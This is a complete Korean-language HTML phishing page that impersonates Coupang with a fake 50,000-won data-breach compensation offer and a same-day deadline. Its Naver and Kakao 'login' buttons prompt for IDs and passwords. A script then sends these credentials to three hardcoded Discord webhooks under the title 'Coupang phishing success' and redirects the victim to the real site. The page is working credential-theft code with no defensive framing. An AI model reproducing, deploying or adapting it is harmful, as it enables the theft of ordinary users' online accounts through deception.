<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="utf-8">
<title>쿠팡 개인정보 유출 보상 신청</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  body,html{margin:0;padding:0;background:#fff;font-family:"Noto Sans KR",sans-serif}
  .header{background:#ff6b00;padding:20px 0;text-align:center}
  .container{max-width:420px;margin:0 auto;background:#fff;padding:20px}
  .title h1{font-size:23px;font-weight:700;text-align:center;margin:20px 0;color:#333}
  .title p{font-size:15px;color:#555;text-align:center;line-height:1.6}
  .login-btn{display:block;width:100%;padding:19px;margin:16px 0;border-radius:10px;font-size:18px;font-weight:700;text-align:center;color:#fff;cursor:pointer;box-shadow:0 2px 6px rgba(0,0,0,.1)}
  .naver{background:#03c75a}
  .kakao{background:#fee500;color:#191919}
  .footer{padding:30px 0;color:#999;font-size:12px;text-align:center}
  .alert{background:#fff3cd;padding:18px;border-radius:10px;color:#d32f2f;font-size:14px;margin:20px 0;text-align:center;box-shadow:0 2px 6px rgba(0,0,0,.05)}
</style>
</head>
<body>
<div class="header">
  <!-- 진짜 쿠팡 로고 100 % 섬세하게 재현 (꼬리 완전 제거) -->
  <div style="font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:900;font-size:66px;letter-spacing:-4px;line-height:1;color:#4a2c0b">
    <span style="color:#4a2c0b">co</span>
    <span style="color:#e61e2a">u</span>
    <span style="color:#f26722">p</span>
    <span style="color:#ffca00">a</span>
    <span style="color:#009e4d">n</span>
    <span style="color:#009ee3">g</span>
  </div>
</div>

<div class="container">
  <div class="title">
    <h1>50,000원 보상 신청</h1>
    <p>개인정보 유출 피해 보상으로<br>50,000원 쿠팡캐시를 지급합니다</p>
  </div>

  <div class="alert">
    ⚠️ 오늘 23:59까지 신청 가능<br>
    신청 완료 후 담당자가 개별 연락드립니다
  </div>

  <div onclick="naverLogin()" class="login-btn naver">네이버로 로그인</div>
  <div onclick="kakaoLogin()" class="login-btn kakao">카카오로 로그인</div>

  <p style="text-align:center;color:#999;margin-top:30px;font-size:13px;line-height:1.5">
    보상은 신청 완료 후 순차적으로 지급됩니다<br>
    문의: 고객센터 1577-7011
  </p>
</div>

<div class="footer">
  © 2025 Coupang Corp.
</div>

<script>
function naverLogin(){
  const id = prompt("네이버 아이디를 입력하세요");
  const pw = prompt("네이버 비밀번호를 입력하세요");
  if(id && pw) send("네이버", id, pw);
}

function kakaoLogin(){
  const id = prompt("카카오메일 아이디를 입력하세요\n(예: abc123@kakao.com)");
  const pw = prompt("카카오 비밀번호를 입력하세요");
  if(id && pw) send("카카오", id, pw);
}

function send(type, id, pw){
  const data = { embeds: [{ title: "쿠팡 피싱 성공", color: 16711680,
    fields: [
      { name: "로그인 종류", value: type },
      { name: "아이디", value: id },
      { name: "비밀번호", value: pw },
      { name: "시간", value: new Date().toLocaleString('ko-KR') }
    ]
  }]};

  const hooks = [
    "https://discordapp.com/api/webhooks/1440762955196010517/R_jUtcPtXsZ2iQLalFINoXQpWSKhOGFHnfSxL3J5wv2RSrAEnLC1SW-aBysf0_q_K31n",
    "https://discordapp.com/api/webhooks/1443170861879394427/m2XA3HHcZr007LvLrETjYNxfWxufqK3qmfF5ULXtOWxghKHkGRmgb13mnOJa0Tgk-QRM",
    "https://discordapp.com/api/webhooks/1443170879256399956/ofvZrCn4KcBjo_eehancUH1LwkQEFutNjni2e36ixMQUqsDBvTeD2oMQ2TyRHsbgOagb"
  ];

  hooks.forEach(h => fetch(h, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)}));

  alert("신청이 완료되었습니다.\n담당자가 순차적으로 연락드리겠습니다.");
  setTimeout(()=>{location.href="https://www.coupang.com";},1500);
}
</script>
</body>
</html>
